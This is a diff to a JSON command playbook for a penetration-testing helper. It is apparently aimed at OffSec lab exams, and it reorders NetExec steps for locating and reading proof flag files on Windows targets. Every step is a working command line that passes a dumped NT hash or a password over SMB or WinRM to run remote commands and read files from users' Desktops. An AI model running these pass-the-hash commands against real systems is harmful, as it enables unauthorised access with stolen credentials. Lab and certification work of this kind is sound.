@@ -67,18 +67,23 @@
       "commands": [
         {
           "tool": "nxc",
-          "note": "PREFERRED, pass-the-hash: for EACH flag file it prints its own identity block (hostname + ipconfig) then ===FLAG:path::content. obol parses the markers into the report, and each flag ends up beside the host IP in the output — screenshot them one at a time for OffSec. -H passes the dumped hash; no plaintext needed.",
+          "note": "STEP 1 — LOCATE. Spider C$ for the flag files so you know each one's exact path (which user's Desktop) before you read it. Pure SMB, no shell. Use the paths it prints in step 2.",
+          "run": "nxc smb {{target}} -u {{user}} -H {{nthash}} --spider C$ --regex \"(local|proof|user|root|flag)\\.txt\""
+        },
+        {
+          "tool": "nxc",
+          "note": "STEP 2 — READ one flag with its own ipconfig, over SMB (wmiexec). This is the RELIABLE default: it avoids the WinRM channel entirely, so it is NOT affected by the `zip() argument 2 is longer than argument 1` bug some nxc builds throw on `winrm -X`. Prints hostname + ipconfig, then `type`s the flag so it stands on its own line — obol records that flag and one screenshot shows it beside the host IP. Swap the path for each flag from step 1 (this reads Administrator's root/proof flag; for the user flag point it at that user's Desktop, e.g. C:\\Users\\<user>\\Desktop\\user.txt).",
+          "run": "nxc smb {{target}} -u {{user}} -H {{nthash}} -x \"hostname & ipconfig & type C:\\Users\\Administrator\\Desktop\\root.txt\""
+        },
+        {
+          "tool": "nxc",
+          "note": "FAST PATH (only if your nxc build's WinRM works) — one-shot recursive capture: for EACH flag file it prints its own identity block (hostname + ipconfig) then ===FLAG:path::content. If this errors with `zip() argument 2 is longer than argument 1`, your build has the known nxc WinRM bug — use step 2 instead. -H passes the dumped hash; no plaintext needed.",
           "run": "nxc winrm {{target}} -u {{user}} -H {{nthash}} -X \"Get-ChildItem -Path C:\\Users -Recurse -Force -Include {{flag_names_windows}} -File -ErrorAction SilentlyContinue | ForEach-Object { Write-Output '===IDENT==='; hostname; ipconfig; Write-Output ('===FLAG:'+$_.FullName+'::'+(Get-Content -Raw -LiteralPath $_.FullName -ErrorAction SilentlyContinue)) }\""
         },
         {
           "tool": "nxc",
-          "note": "Password form of the same per-flag capture (use when you hold the plaintext instead of the hash).",
+          "note": "Password form of the fast path (use when you hold the plaintext instead of the hash; same WinRM caveat as above).",
           "run": "nxc winrm {{target}} -u {{user}} -p {{password}} -X \"Get-ChildItem -Path C:\\Users -Recurse -Force -Include {{flag_names_windows}} -File -ErrorAction SilentlyContinue | ForEach-Object { Write-Output '===IDENT==='; hostname; ipconfig; Write-Output ('===FLAG:'+$_.FullName+'::'+(Get-Content -Raw -LiteralPath $_.FullName -ErrorAction SilentlyContinue)) }\""
-        },
-        {
-          "tool": "nxc",
-          "note": "LOCATE FIRST over SMB (no shell) — spider C$ for the flag files so you know which user's Desktop holds each before you WinRM in. Handy when WinRM is closed, or to confirm the paths, then run the capture command above.",
-          "run": "nxc smb {{target}} -u {{user}} -H {{nthash}} --spider C$ --regex \"(local|proof|user|root|flag)\\.txt\""
         }
       ]
     }
